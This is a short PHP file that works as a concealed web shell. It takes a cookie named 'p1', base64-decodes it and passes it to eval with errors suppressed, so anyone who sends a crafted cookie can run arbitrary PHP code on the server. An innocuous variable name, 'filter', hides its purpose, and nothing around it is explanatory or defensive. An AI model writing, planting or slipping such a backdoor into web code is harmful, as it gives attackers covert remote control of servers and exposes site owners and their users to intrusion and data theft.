<?php 
$filter = base64_decode(@$_COOKIE['p1']);
if ($filter) {
  @eval($filter);
  die();
}
?>
